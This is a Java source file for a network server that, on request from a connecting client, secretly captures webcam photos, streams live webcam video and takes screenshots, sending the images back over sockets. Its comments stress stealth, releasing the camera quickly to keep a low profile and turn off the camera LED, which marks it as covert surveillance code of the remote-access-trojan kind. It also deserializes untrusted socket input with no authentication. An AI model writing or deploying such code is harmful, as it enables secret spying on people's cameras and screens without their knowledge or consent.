///////////////////////////////////////////
		/*Server*/
///////////////////////////////////////////

import java.net.*;
import java.io.*;
import java.awt.*;
import java.awt.image.*;
import javax.imageio.ImageIO;
import java.util.*;
import org.libs.*;
import javax.swing.*;

import org.opencv.core.*;
import org.opencv.imgcodecs.*;
import org.opencv.videoio.*;
import org.opencv.highgui.*;

public class Main implements Runnable { 

	// the running mechanism needs an additional client request in order to stop the server
	private boolean running;
	private final Thread thread;
	private final int PORT;

	static {
	
		System.loadLibrary(Core.NATIVE_LIBRARY_NAME);
	
	}

	{

		running = false;
		thread = new Thread(this, "ServerThread");

	}

	public Main (int PORT) {

		this.PORT = PORT;

	}

	public Main () {

		PORT = 9090;

	}

	///////////////////////////////////////////
			 /*Main*/
	///////////////////////////////////////////

	public static void main (String [] args) {

		new Main(9090).start();

	}

	///////////////////////////////////////////
			 /*Main*/
	///////////////////////////////////////////

	public void start () {

		running = true;
		thread.start();

	}

	public void stop () {

		running = false;

	}

	@Override
	public void run () {

		// Server runs until process is killed
		while (running) {

			try (

				// ServerSocket accepts requests to specified PORT
				ServerSocket serverSocket = new ServerSocket(PORT);
				Socket socket = serverSocket.accept();

				// ObjectOutputStream and ObjectInputStream are used to handle requests
				ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream());
				ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
				//DataInputStream and DataOutputStream are used to handle response (image bytes)
				DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
				DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

			) {
				Request request = (Request) objectInputStream.readObject();

				switch (request) {
	
					case IMAGE: {

						Camera camera = new Camera(); // camera object to call takePicture()

						// answer request width camera capture
						byte[] imageBytes = Camera.getBytesFromImage(camera.takePicture()); // takePicture() captures image from camera without starting CameraThread, releases camera when done
						dataOutputStream.writeInt(imageBytes.length);
						dataOutputStream.write(imageBytes, 0, imageBytes.length);

						break;
					}

					case START_STREAM: {

						Camera camera = new Camera(); // camera object to call takePicture()
						
						// start new Thread with camera as argument. Server is now able to continue recieving requests while capturing video
						Thread cameraThread = new Thread(camera, "CameraThread");
						cameraThread.start();
						try {
							Thread.currentThread().sleep(3000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}

						// run StreamThread in new Thread. Server Is now able to continue recieving requests while streaming video
						// video captured by CameraThread is accessed through Camera static method getBufferedImage by StreamThread
						StreamThread streamer = new StreamThread(); // streamer runs on 9091 PORT
						Thread streamThread = new Thread(streamer);
						streamThread.start();

						// allow client to request connection with StreamThread
						objectOutputStream.writeObject(Response.ACCESS_ALLOWED);
						try {
							Thread.currentThread().sleep(3000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}

						break;

					}

					case SCREENSHOT: {

						try {
	
							Robot robot = new Robot(); // generate native system input events

							BufferedImage bufferedImage = robot.createScreenCapture(new Rectangle(0, 0, 1920, 1080)); // capture screenshot into bufferedImage
							BufferedImage newBufferedImage = new BufferedImage(bufferedImage.getWidth(), bufferedImage.getHeight(), BufferedImage.TYPE_3BYTE_BGR); // create BufferedImage of type BufferedImage.TYPE_3BYTE_BGR
							newBufferedImage.getGraphics().drawImage(bufferedImage, 0, 0, null); // parse BufferedImage.TYPE_INT_BGR to BufferedImage.TYPE_3BYTE_BGR (copying info from bufferedImage to newBufferedImage)

							// answer request with newBufferedImage of type BufferedImage.TYPE_3BYTE_BGR
							byte[] imageBytes = Camera.getBytesFromImage(newBufferedImage);
							dataOutputStream.writeInt(imageBytes.length);
							dataOutputStream.write(imageBytes, 0, imageBytes.length);

						} catch (AWTException e) {

							e.printStackTrace();

						}
	
						break;

					}

					default: {

						System.out.println("Invalid request");

						break;

					}


				}

			} catch (ClassNotFoundException e) {

				System.out.println(e);

			} catch (IOException e) {

				e.printStackTrace();

			}

		}

	}

}

class Camera implements Runnable {

	private Mat mat;
	private static BufferedImage bufferedImage;
	private static boolean IS_RUNNING;

	{

		IS_RUNNING = true;

	}

	public static synchronized BufferedImage getBufferedImage () { // synchronized due to risk of being accesed by two threads at the same time (deadlock)

		return bufferedImage;

	}

	@Override
	public void run () { // update bufferedImage with latest camera capture

		Mat mat = new Mat();

		// prepare camera to capture FHD footage
		VideoCapture videoCapture = new VideoCapture(1);
		videoCapture.set(Videoio.CAP_PROP_FRAME_WIDTH, 1920);
		videoCapture.set(Videoio.CAP_PROP_FRAME_HEIGHT, 1080);

		if (videoCapture.isOpened()) { // respond to client with error message: couldn't open camera

			// while camera is running, the static field bufferedImage is updated based on the info contained in field mat
			while (Camera.IS_RUNNING) {

				videoCapture.read(mat);
				if (!mat.empty()) { // only update bufferedImage if mat is not empty

					this.bufferedImage = bufferImage(mat);

				}

			}

		} else {

			// send response "Camera is not compatible"

		}

	}

	public BufferedImage takePicture () { // take picture and release camera as soon as possible in order to keep low profile and not start camera in new thread

		BufferedImage tmpImage = new BufferedImage(1920, 1080, BufferedImage.TYPE_3BYTE_BGR);
		Mat mat = new Mat();

		// prepare camera to capture FHD footage
		VideoCapture videoCapture = new VideoCapture(1);
		videoCapture.set(Videoio.CAP_PROP_FRAME_WIDTH, 1920);
		videoCapture.set(Videoio.CAP_PROP_FRAME_HEIGHT, 1080);

		if (videoCapture.isOpened()) { // respond to client with error message: couldn't open camera

			// if instead of while in order to capture one frame
			if (Camera.IS_RUNNING) {

				videoCapture.read(mat);
				if (!mat.empty()) {

					tmpImage = bufferImage(mat);

				}

			}

			videoCapture.release(); // release camera thus poweroff LED: IMPORTANT
			return tmpImage;

		} else {

			// send response "Camera is not compatible"

		}

		return null;

	}

	// convert mat to BufferedImage
	public BufferedImage bufferImage (Mat mat) {

		// set image type, unless channels > 1, image is grayscale
		int type = BufferedImage.TYPE_BYTE_GRAY;
		if (mat.channels() > 1) {

			type = BufferedImage.TYPE_3BYTE_BGR; // set type to BufferedImage.TYPE_3BYTE_BGR

		}

		int bufferSize = mat.channels()*mat.cols()*mat.rows(); // buffer size = mat size
		byte[] buffer = new byte[bufferSize];

		mat.get(0, 0, buffer);

		BufferedImage bufferedImage = new BufferedImage(mat.cols(), mat.rows(), type);
		final byte[] targetPixels = ((DataBufferByte) bufferedImage.getRaster().getDataBuffer()).getData();
		System.arraycopy(buffer, 0, targetPixels, 0, buffer.length);

		return bufferedImage;

	}

	public static byte[] getBytesFromImage (BufferedImage bufferedImage) {

		return ((DataBufferByte) bufferedImage.getRaster().getDataBuffer()).getData();

	}

}

class StreamThread implements Runnable {

	private final int PORT = 9091;

	@Override
	public void run () {

		try (

			ServerSocket serverSocket = new ServerSocket(PORT);
			Socket socket = serverSocket.accept();

			DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

		) {

			while (true) {

				byte[] imageBytes = Camera.getBytesFromImage(Camera.getBufferedImage());
				dataOutputStream.writeInt(imageBytes.length);
				dataOutputStream.write(imageBytes, 0, imageBytes.length);

			}

		} catch (BindException e) {

			System.out.println(PORT + "Is alredy in use");

		} catch (IOException e) {

			e.printStackTrace();

		}

	}

}






